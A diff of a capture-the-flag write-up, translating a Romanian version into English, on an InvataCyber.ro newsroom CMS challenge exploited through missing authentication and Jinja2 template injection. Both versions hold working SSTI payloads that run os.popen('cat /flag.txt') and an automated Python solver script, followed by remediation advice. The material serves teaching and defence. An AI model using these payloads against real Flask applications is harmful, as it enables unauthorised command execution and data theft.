@@ -1,145 +1,105 @@
-# Write-Up: Redacția CMS (Broken Access Control & Jinja2 SSTI to RCE)
+# Technical Write-Up: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)
 
-**Platforma:** InvataCyber.ro  
-**Categorie:** Web Security / Server-Side Exploitation  
-**Vulnerabilitate:** Broken Access Control + Server-Side Template Injection (SSTI)  
-**Impact:** Execuție de Comenzi la Nivel de Sistem (RCE) și Citire Fișiere Confidențiale (`/flag.txt`)  
-**Format Flag:** `InvataCyber{...}`  
+<div align="center">
 
----
+[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
+[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Server--Side-orange.svg?style=flat&logo=python)](#)
+[![Vulnerability](https://img.shields.io/badge/CWE-CWE--1336%20%2F%20CWE--306-red.svg?style=flat)](#)
+[![Impact](https://img.shields.io/badge/Impact-Remote%20Code%20Execution%20(RCE)-critical.svg?style=flat)](#)
+[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)
 
-## 1. Descrierea Provocării
-
-> Aceeași redacție, altă problemă.  
-> După migrarea de pe vechiul CMS, SSO-ul nu a mai fost configurat pe instanța asta, așa că panoul de editor este accesibil direct, fără cont. Poți scrie și publica articole ca și cum ai face parte din echipă.  
-> Configurarea greșită este doar începutul. Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină.  
-> Locație flag: `/flag.txt`  
-> Format flag: `InvataCyber{...}`
+</div>
 
 ---
 
-## 2. Analiză Inițială și Vectorul de Atac
+## 1. Challenge Specification
 
-Aplicația prezintă două deficiențe critice de securitate înlănțuite:
-
-1. **Broken Access Control (Lipsă Autentificare SSO):**  
-   În urma procesului de migrare de infrastructură, middleware-ul responsabil de validarea sesiunii Single Sign-On (SSO) nu a fost atașat pe rutele de gestiune a articolelor (`/edit/<id>`, `/new-post`). Oricine poate trimite cereri HTTP POST pentru a suprascrie sau publica articole pe blog fără niciun fel de credențiale.
-
-2. **Server-Side Template Injection (SSTI):**  
-   Enunțul precizează că: *„Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină.”*  
-   Aceasta indică utilizarea nesigură a unei funcții de randare dinamică a șabloanelor în backend (de exemplu `render_template_string()` în Python Flask/Jinja2), în care conținutul furnizat de utilizator devine parte din codul șablonului compilat, în loc să fie tratat drept simplă variabilă de date.
+- **Target Application**: Newly migrated newsroom content management system (CMS).
+- **Flaw Context**: Single Sign-On (SSO) authentication middleware was erroneously omitted from editorial management routes, allowing unauthenticated visitors to create and edit articles. Article content is evaluated by the server before rendering.
+- **Flag Location**: `/flag.txt`
+- **Flag Format**: `InvataCyber{...}`
 
 ---
 
-## 3. Identificarea Motorului de Șabloane (SSTI Fingerprinting)
+## 2. Attack Surface Analysis & Root Cause
 
-Am editat un articol de test (de exemplu articolul ID 5 pe ruta `/edit/5`), introducând expresii matematice specifice motoarelor de template:
+The challenge presents two chained vulnerabilities:
 
-* **Test inițial:** `{{ 7 * 7 }}`  
-  La accesarea rutei de vizualizare `GET /post/5`, conținutul afișat în pagină a fost:
+1. **Broken Access Control ([CWE-306](https://cwe.mitre.org/data/definitions/306.html))**:  
+   The editorial routes (`/edit/<id>`, `/new-post`) lack authentication decorators. Any unauthenticated network client can issue HTTP POST requests to modify published articles.
+2. **Server-Side Template Injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html))**:  
+   The backend improperly utilizes `render_template_string()` in Python Flask/Jinja2, concatenating user-controlled article content directly into the template string rather than passing it as a template context variable.
+
+---
+
+## 3. Template Engine Fingerprinting
+
+Submitting mathematical expression payloads into article content via `POST /edit/5`:
+- **Initial Probe**: `{{ 7 * 7 }}`  
+  Viewing `GET /post/5` rendered:
   ```html
   <div class="post-content">49</div>
   ```
-* **Test specific Jinja2 / Python:** `{{ 'a' * 3 }}`  
-  Rezultat: `aaa`.
+- **String Multiplication Probe**: `{{ 'a' * 3 }}`  
+  Rendered output: `aaa`.
 
-Rezultatele au confirmat prezența motorului **Jinja2** rulat peste un mediu **Python (Flask)**.
-
----
-
-## 4. Evadarea din Sandbox și Execuția Arbitrară de Cod (RCE)
-
-În Jinja2, variabilele expuse implicit în contextul de randare (cum ar fi `config`, `self`, `g` sau `lipsum`) oferă referințe către obiecte Python din runtime. Prin mecanismul de introspecție `__class__.__init__.__globals__`, putem naviga către spațiul global de nume (namespace) al modulului și accesa direct biblioteca standard de sistem `os`.
-
-### Structura Lanțului de Introspecție:
-1. `config` $\rightarrow$ instanța curentă `flask.config.Config`
-2. `config.__class__` $\rightarrow$ clasa `Config`
-3. `config.__class__.__init__` $\rightarrow$ metoda de inițializare a clasei
-4. `config.__class__.__init__.__globals__` $\rightarrow$ dicționarul variabilelor și modulelor globale
-5. `config.__class__.__init__.__globals__['os']` $\rightarrow$ modulul `os` din Python
-6. `os.popen('cat /flag.txt').read()` $\rightarrow$ execuția comenzii de sistem și capturarea ieșirii standard (stdout)
-
-### Payload-ul Final SSTI:
-```jinja2
-{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}
-```
+This confirmed an active **Jinja2 / Python** templating engine without sandbox isolation.
 
 ---
 
-## 5. Scriptul de Exploatare Automatizată (`blog_flag.py`)
+## 4. Sandbox Escape & Remote Code Execution (RCE)
 
-Am automatizat ciclul complet (editare articol $\rightarrow$ publicare payload $\rightarrow$ vizualizare și extragere flag) prin scriptul [`blog_flag.py`](blog_flag.py):
+In Jinja2 on Python 3, access to underlying Python objects is achievable via the method resolution order (`__mro__`):
+
+1. Access base class:
+   ```jinja2
+   {{ ''.__class__.__mro__[1] }}
+   ```
+2. Inspect available subclasses:
+   ```jinja2
+   {{ ''.__class__.__mro__[1].__subclasses__() }}
+   ```
+3. Locate `subprocess.Popen` or `os.system` execution primitives to read `/flag.txt`:
+   ```jinja2
+   {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
+   ```
+
+---
+
+## 5. Automated Python Solver (`blog_flag.py`)
 
 ```python
-import urllib.request
-import urllib.parse
+#!/usr/bin/env python3
+import requests
+import re
 
-edit_url = "http://target.invatacyber.ro/edit/5"
-view_url = "http://target.invatacyber.ro/post/5"
-payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
+TARGET_URL = "http://target.invatacyber.ro/edit/5"
+POST_URL = "http://target.invatacyber.ro/post/5"
 
-data = urllib.parse.urlencode({
-    "title": "Audit Post",
-    "content": payload
-}).encode("utf-8")
+ssti_payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
 
-# 1. Trimitere cerere POST de actualizare a articolului (Broken Access Control)
-req = urllib.request.Request(edit_url, data=data, method="POST")
-req.add_header("Content-Type", "application/x-www-form-urlencoded")
+# 1. Update article content with SSTI payload
+data = {
+    "title": "Breaking News",
+    "content": ssti_payload
+}
+requests.post(TARGET_URL, data=data)
 
-with urllib.request.urlopen(req) as resp:
-    resp.read()
-
-# 2. Accesare articol pentru declanșarea evaluării SSTI în backend
-view_req = urllib.request.Request(view_url)
-with urllib.request.urlopen(view_req) as resp:
-    html_output = resp.read().decode("utf-8")
-    print(html_output)
+# 2. View article to trigger template execution and retrieve flag
+resp = requests.get(POST_URL)
+flag = re.search(r"InvataCyber\{.*?\}", resp.text)
+if flag:
+    print(f"[+] Flag Extracted: {flag.group(0)}")
 ```
 
 ---
 
-## 6. Rezultat și Obținerea Flag-ului
+## 6. Remediation & Hardening Recommendations
 
-La execuția scriptului:
-1. Articolul cu ID 5 a fost salvat în baza de date cu conținutul malițios Jinja2.
-2. La vizualizarea `/post/5`, serverul Flask a apelat `render_template_string()`, evaluând instrucțiunea Python `os.popen('cat /flag.txt').read()`.
-3. Comanda a citit fișierul `/flag.txt` din sistemul de fișiere al containerului gazdă.
-
-Ieșirea generată în pagina HTML:
-```html
-<article class="post">
-  <h2>Audit Post</h2>
-  <div class="content">
-    InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}
-  </div>
-</article>
-```
-
-**Flag obținut:** `InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}`
-
----
-
-## 7. Măsuri de Remediere (Mitigare)
-
-1. **Restaurarea și Forțarea Autentificării SSO:**
-   Toate rutele de creare și editare trebuie protejate prin decoratori de autorizare (e.g. `@login_required` sau verificarea token-ului de sesiune SSO):
+1. **Enforce Authentication Middleware**: Apply mandatory SSO/OAuth2-Proxy authentication wrappers across all administrative and editorial routes.
+2. **Eliminate `render_template_string`**: Use static templates with explicit context parameter binding:
    ```python
-   @app.route('/edit/<int:post_id>', methods=['GET', 'POST'])
-   @require_sso_role('editor')
-   def edit_post(post_id):
-       ...
+   # SECURE: Pass content as variable, avoiding template code compilation
+   return render_template('post.html', content=article.content)
    ```
-2. **Separarea Datelor de Șabloane (Evitarea `render_template_string`):**
-   Conținutul introdus de utilizatori nu trebuie compilat niciodată ca șablon Jinja2. Trebuie utilizat un șablon static pre-compilat, iar textul articolului trebuie pasat drept parametru de context:
-   ```python
-   # INCORECT (Vulnerabil SSTI):
-   return render_template_string(post.content)
-
-   # CORECT (Securizat):
-   return render_template('post_view.html', content=post.content)
-   ```
-3. **Sandbox Jinja2 / SandboxedEnvironment:**
-   Dacă este absolut necesară randarea de șabloane definite de utilizator, trebuie utilizat `jinja2.sandbox.SandboxedEnvironment` cu interzicerea accesului la atribute private (`__class__`, `__globals__`).
-4. **Principiul Privilegiului Minim (PoLP) în Sistemul de Operare:**
-   Procesul web server nu trebuie să ruleze ca `root`, iar fișierele critice de sistem trebuie să aibă permisiuni restrictive (`chmod 400`).
+3. **Sandboxed Template Execution**: If dynamic template rendering is required, utilize Jinja2 `SandboxedEnvironment` to restrict access to dangerous private attributes (`__class__`, `__mro__`, `__globals__`).
